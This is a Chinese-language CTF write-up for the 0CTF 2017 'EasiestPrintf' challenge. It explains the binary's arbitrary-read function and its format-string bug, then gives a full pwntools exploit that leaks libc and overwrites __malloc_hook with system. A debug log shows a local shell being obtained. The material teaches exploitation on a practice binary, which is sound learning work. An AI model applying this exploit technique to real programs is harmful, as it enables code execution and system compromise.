> 题目来源：0CTF 2017 Quals：EasiestPrintf
>
> 可以参考的资料：
>
> [https://www.dazhuanlan.com/2019/11/03/5dbea310079f2/](https://www.dazhuanlan.com/2019/11/03/5dbea310079f2/)
>
> [https://poning.me/2017/03/23/EasiestPrintf/](https://poning.me/2017/03/23/EasiestPrintf/)
>
> [https://blog.betamao.me/2018/03/09/%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%B2%E6%BC%8F%E6%B4%9E/#0ctf-2017-easiestprintf-150](https://blog.betamao.me/2018/03/09/%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%B2%E6%BC%8F%E6%B4%9E/#0ctf-2017-easiestprintf-150)
>
> [https://cartermgj.github.io/2017/12/20/0ctf-easiestPrintf/](https://cartermgj.github.io/2017/12/20/0ctf-easiestPrintf/)
>
> 附件：
>
> 链接：[https://pan.baidu.com/s/19MopXusMVhzLd0VZWKSttQ](https://pan.baidu.com/s/19MopXusMVhzLd0VZWKSttQ)
>
> 提取码：s7pu 
>

> 复制这段内容后打开百度网盘手机App，操作更方便哦--来自百度网盘超级会员V3的分享
>

# 前置知识
printf函数在输出较多内容时，会调用malloc函数分配缓冲区，输出结束之后会调用free函数释放申请的缓冲区内存。同样的scanf函数也会调用malloc。

# 举个例子
> gcc -g -fno-stack-protector test.c -o test
>

```c
#include<stdio.h>
int main(){
    char s[100000];
    scanf("%s",&s);
    printf("%s",s);
    return 0;
}
```

感兴趣的话可以自己编译调试一下，这里就不再细说。

> 注意，在编译的时候有的编译器会将代码中的printf函数替换为puts函数，这里需要注意一下。
>

# IDA静态分析程序
> 将程序拖入到IDA中，开始静态分析。
>

## main函数
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  void *v3; // esp
  char buf; // [esp+3h] [ebp-15h]
  int fd; // [esp+4h] [ebp-14h]
  int v6; // [esp+8h] [ebp-10h]
  unsigned int v7; // [esp+Ch] [ebp-Ch]

  v7 = __readgsdword(0x14u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  alarm(0x3Cu);   //程序自动停止倒计时
  sleep(3u);
  fd = open("/dev/urandom", 0);
  if ( read(fd, &buf, 1u) != 1 )
    exit(-1);
  close(fd);
  v6 = buf;
  v3 = alloca(16 * ((buf + 30) / 0x10u));
  do_read();
  leave();
}
```

main函数的开头就有一个alarm函数，在之前的文章中也见到过，这对我们调试程序十分的不利。如下图所示：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603073118349-b6d4b189-69ff-4f97-b438-b781b0459982.png)

在HxD中找到这个机器码，修改为6A FF：（注意，别修改错地方）

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603073298766-df863608-f515-451a-b6ed-512d54266957.png)

保存文件为EasiestPrintf_patch，将修改后的文件再次放入IDA中，再次查看main函数：

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  void *v3; // esp
  char buf; // [esp+3h] [ebp-15h]
  int fd; // [esp+4h] [ebp-14h]
  int v6; // [esp+8h] [ebp-10h]
  unsigned int v7; // [esp+Ch] [ebp-Ch]

  v7 = __readgsdword(0x14u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  alarm(0xFFFFFFFF);                //alarm(4294967295u);
  sleep(3u);
  fd = open("/dev/urandom", 0);
  if ( read(fd, &buf, 1u) != 1 )
    exit(-1);
  close(fd);
  v6 = buf;
  v3 = alloca(16 * ((buf + 30) / 0x10u));
  do_read();
  leave();
}
```

这时，我们的程序已经被修改为几乎无限长的时间了。仔细的查看一下main函数吧：

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  void *v3; // esp
  char buf; // [esp+3h] [ebp-15h]
  int fd; // [esp+4h] [ebp-14h]
  int v6; // [esp+8h] [ebp-10h]
  unsigned int v7; // [esp+Ch] [ebp-Ch]

  v7 = __readgsdword(0x14u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  alarm(4294967295u);            //闹钟函数
  sleep(3u);
  fd = open("/dev/urandom", 0);  //利用urandom文件产生随机数
  if ( read(fd, &buf, 1u) != 1 )
    exit(-1);
  close(fd);
  v6 = buf;
  v3 = alloca(16 * ((buf + 30) / 0x10u));
  //alloca在栈上分配内存，由于随机数的产生，这里实现了栈地址随机化
  do_read();
  leave();
}
```

> 强调：此程序含有栈地址随机化，因此我们无法覆盖栈上的函数地址
>

## do_read函数
IDA伪代码如下：

> 很明显此函数没有返回值，所以将此函数类型由int改为void
>

```c
void __cdecl do_read()
{
  _DWORD *v0; // [esp+8h] [ebp-10h]
  unsigned int v1; // [esp+Ch] [ebp-Ch]

  v1 = __readgsdword(0x14u);
  v0 = 0;
  puts("Which address you wanna read:");
  _isoc99_scanf("%u", &v0);  //输入的是10进制无符号的数
  printf("%#x\n", *v0);  //打印出16进制的输入地址的内容
}
```

> 这个函数可以实现任意地址读取，请注意输入和输出
>

## leave函数
```c
void __noreturn leave()
{
  signed int i; // [esp+8h] [ebp-B0h]
  char s[160]; // [esp+Ch] [ebp-ACh]
  unsigned int v2; // [esp+ACh] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  memset(s, 0, 0xA0u);
  puts("Good Bye");
  for ( i = 0; i <= 158; ++i )
  {
    if ( read(0, &s[i], 1u) != 1 )  //读入数据
      exit(-1);
    if ( s[i] == 10 )  //read到'\n'停止
      break;
  }
  printf(s);  //格式化字符串漏洞
  exit(0);
}
```

> 强调：此函数有格式化字符串漏洞
>

# 动态运行程序
检查文件的保护：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603074838577-8a88b92c-565e-42ba-b774-1d6cccc5da85.png)

```c
➜  EasietPrintf checksec --file=EasiestPrintf_patch
[*] '/home/ubuntu/Desktop/EasietPrintf/EasiestPrintf_patch'
    Arch:     i386-32-little
    RELRO:    Full RELRO     //开启意味着无法修改程序的got表和got.plt
    Stack:    Canary found   //每段函数开头生成随机数，结尾进行校验，防止栈溢出
    NX:       NX enabled     //无法向栈上注入shellcode
    PIE:      No PIE (0x8048000)
➜  EasietPrintf 
```

32位程序，只有PIE保护没有开启。

运行一下程序：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603075792527-a9b7776e-c400-4549-967d-4b2b1275f6a2.png)

> do_read函数的起始地址：0x0804870B==134514443（十进制）
>

可以看到，已经打印出对应地址的内容：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603075893982-afe1267d-ebc5-415e-a3d8-5d2f016057f8.png)

因此，我们可以利用这个程序的功能泄露出libc的基址

# exp及思路讲解
> payload调试过程略，主要是懒，感兴趣的话可以自己调试一下：gdb.attach(r)
>

---

在前面说过，当printf函数在较多输出内容时，会调用malloc函数分配缓冲区，在输出结束时候会调用free函数释放申请的内存。因此思路是通过覆盖__free_hook或者是__malloc_hook来劫持EIP。

先贴上exp：

```c
#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.log_level = "debug"
binary=ELF('./EasiestPrintf_patch')
libc=ELF('/lib/i386-linux-gnu/libc.so.6')

startGot = binary.got['__libc_start_main']
log.info("startGot:"+hex(startGot))

r=process('./EasiestPrintf_patch')
r.sendlineafter('Which address you wanna read:',str(startGot))
r.recvuntil('0x')
startAddr = int(r.recv(8),16)
#泄露libc基址------------------------------------------------------------------
libc.address = startAddr - libc.symbols['__libc_start_main']
log.info('libc_base: ' + hex(libc.address))
log.info('__free_hook: ' + hex(libc.symbols['__free_hook']))
log.info('__malloc_hook: ' + hex(libc.symbols['__malloc_hook']))
log.info('systemAddr:' + hex(libc.symbols['system']))

#将“sh\x0a”字符串放到空闲的bss段中，将__malloc_hook函数地址覆盖为system地址-------------
writes = {0x804a04c :u32('sh;a'),libc.symbols['__malloc_hook']:libc.symbols['system']}
#当然，你也可以覆盖__free_hook函数
#使用超长长度的数据来使printf调用malloc函数---------------------------------------
width = 0x804a04c - 0x20 
payload_1 = fmtstr_payload( offset = 7,writes = writes,numbwritten = 0,write_size = 'short') 
log.info('payload_1 is:%s'% payload_1)
payload_2 = '%{}c'.format(width)
log.info('payload_2 is:%s'% payload_2)
payload =payload_1+ payload_2

log.info('payload is:%s'% payload)
log.info('payload len:%s'%len(payload))

r.sendline(payload)
r.interactive()
```

日志如下：

```c
➜  EasietPrintf python EasiestPrintf_end.py
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/ubuntu/.cache/.pwntools-cache-2.7/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.2.1)
[DEBUG] PLT 0x8048590 read
[DEBUG] PLT 0x8048598 printf
[DEBUG] PLT 0x80485a0 _exit
[DEBUG] PLT 0x80485a8 sleep
[DEBUG] PLT 0x80485b0 alarm
[DEBUG] PLT 0x80485b8 __stack_chk_fail
[DEBUG] PLT 0x80485c0 puts
[DEBUG] PLT 0x80485c8 __gmon_start__
[DEBUG] PLT 0x80485d0 exit
[DEBUG] PLT 0x80485d8 open
[DEBUG] PLT 0x80485e0 __libc_start_main
[DEBUG] PLT 0x80485e8 setvbuf
[DEBUG] PLT 0x80485f0 memset
[DEBUG] PLT 0x80485f8 __isoc99_scanf
[DEBUG] PLT 0x8048600 close
[*] '/home/ubuntu/Desktop/EasietPrintf/EasiestPrintf_patch'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[DEBUG] PLT 0x176b0 _Unwind_Find_FDE
[DEBUG] PLT 0x176c0 realloc
[DEBUG] PLT 0x176e0 memalign
[DEBUG] PLT 0x17710 _dl_find_dso_for_object
[DEBUG] PLT 0x17720 calloc
[DEBUG] PLT 0x17730 ___tls_get_addr
[DEBUG] PLT 0x17740 malloc
[DEBUG] PLT 0x17748 free
[*] '/lib/i386-linux-gnu/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] startGot:0x8049fec
[+] Starting local process './EasiestPrintf_patch' argv=['./EasiestPrintf_patch'] : pid 12201
[DEBUG] Received 0x1e bytes:
    'Which address you wanna read:\n'
[DEBUG] Sent 0xa bytes:
    '134520812\n'
[DEBUG] Received 0x14 bytes:
    '0xf7e16550\n'
    'Good Bye\n'
[*] libc_base: 0xf7dfe000
[*] __free_hook: 0xf7fb28b0
[*] __malloc_hook: 0xf7fb1768
[*] systemAddr:0xf7e38db0
[*] payload_1 is:%24891c%20$hn%1848c%21$hn%9533c%22$hn%27187c%23$hnaaN\xa0\x04L\xa0\x04h\x17�j��
[*] payload_2 is:%134520876c
[*] payload is:%24891c%20$hn%1848c%21$hn%9533c%22$hn%27187c%23$hnaaN\xa0\x04L\xa0\x04h\x17�j��%134520876c
[*] payload len:79
[DEBUG] Sent 0x50 bytes:
    00000000  25 32 34 38  39 31 63 25  32 30 24 68  6e 25 31 38  │%248│91c%│20$h│n%18│
    00000010  34 38 63 25  32 31 24 68  6e 25 39 35  33 33 63 25  │48c%│21$h│n%95│33c%│
    00000020  32 32 24 68  6e 25 32 37  31 38 37 63  25 32 33 24  │22$h│n%27│187c│%23$│
    00000030  68 6e 61 61  4e a0 04 08  4c a0 04 08  68 17 fb f7  │hnaa│N···│L···│h···│
    00000040  6a 17 fb f7  25 31 33 34  35 32 30 38  37 36 63 0a  │j···│%134│5208│76c·│
    00000050
[*] Switching to interactive mode

Good Bye
[DEBUG] Received 0x1000 bytes:
    ' ' * 0x1000
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                [DEBUG] Received 0x1000 bytes:
    ' ' * 0x1000
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                [DEBUG] Received 0x1000 bytes:
    ' ' * 0x1000
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                [DEBUG] Received 0x1000 bytes:
    ' ' * 0x1000
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                [DEBUG] Received 0x1000 bytes:
    ' ' * 0x1000
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                [DEBUG] Received 0x1000 bytes:
    ' ' * 0x1000
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                [DEBUG] Received 0x1000 bytes:
    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000130  20 20 20 20  20 20 20 20  20 20 9b 20  20 20 20 20  │    │    │  · │    │
    00000140  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000870  20 20 01 20  20 20 20 20  20 20 20 20  20 20 20 20  │  · │    │    │    │
    00000880  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00001000
                                                                                                                                                                                                                                                                                                                          \x9b                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   [DEBUG] Received 0x1000 bytes:
    ' ' * 0x1000
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                [DEBUG] Received 0x1000 bytes:
    '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               =                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                '
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               =                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                [DEBUG] Received 0x1000 bytes:
    ' ' * 0x1000
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                [DEBUG] Received 0x1000 bytes:
    ' ' * 0x1000
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                [DEBUG] Received 0x1000 bytes:
    ' ' * 0x1000
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                [DEBUG] Received 0x1000 bytes:
    ' ' * 0x1000
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                [DEBUG] Received 0x1000 bytes:
    ' ' * 0x1000
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x6c bytes:
    'EasiestPrintf\t      EasiestPrintf_exp1.py  glibc-2.23\n'
    'EasiestPrintf_end.py  EasiestPrintf_patch    malloc.c\n'
EasiestPrintf          EasiestPrintf_exp1.py  glibc-2.23
EasiestPrintf_end.py  EasiestPrintf_patch    malloc.c
$ whoami
[DEBUG] Sent 0x7 bytes:
    'whoami\n'
[DEBUG] Received 0x7 bytes:
    'ubuntu\n'
ubuntu
$ id
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Received 0x81 bytes:
    'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)\n'
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$  
```

